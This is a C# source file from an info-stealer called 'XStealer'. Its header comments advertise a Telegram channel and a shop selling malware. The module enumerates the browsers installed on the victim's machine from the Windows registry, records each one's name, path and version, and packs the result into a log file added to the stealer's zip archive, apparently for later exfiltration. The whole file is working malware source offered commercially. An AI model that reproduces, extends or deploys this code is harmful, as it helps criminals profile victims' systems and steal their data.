// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System.Diagnostics;
    using System.IO;
    using System.Text;
    using Microsoft.Win32;

    public static class PacketBrowsers
    {
        private const string SMIWOW = @"SOFTWARE\WOW6432Node\Clients\StartMenuInternet", SMI = @"SOFTWARE\Clients\StartMenuInternet";
        private const string COMM = @"shell\open\command";

        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            int countBrowser = 1; // Счётчик браузеров
            try
            {
                using var data = new StreamWriter(ms, Encoding.UTF8);
                // Открываем раздел в реестре
                using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(SMIWOW) ?? Registry.LocalMachine.OpenSubKey(SMI);
                // Читаем все имена разделов
                string[] subKeyNames = registryKey?.GetSubKeyNames();
                // Перебираем имена разделов в цикле
                for (int i = 0; i < subKeyNames.Length; i++)
                {
                    // Внутренний цикл
                    try
                    {
                        // Открываем раздел реестра
                        using RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
                        // Записываем данные значения в файл
                        data.WriteLine($"{countBrowser}) Name: {registryKey2?.GetValue(null)?.ToString()},\t");
                        // Открывем раздел реестра
                        using RegistryKey registryKey3 = registryKey2.OpenSubKey(COMM);
                        // Получаем значения из раздела
                        string PathBrowser = registryKey3?.GetValue(null)?.ToString().Trim('"');
                        // Записываем значения в файл
                        data.WriteLine($"Path: {PathBrowser},\t");
                        data.WriteLine($"Version: {FileVersionInfo.GetVersionInfo(PathBrowser)?.FileVersion.ToString() ?? "Unknown Version"}");
                        countBrowser++; // Увеличиваем счётчик
                    }
                    catch { continue; }
                }
                ZipEx.AddKeyPairStream("Installed_Software_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
            }
            catch { }
        }
    }
}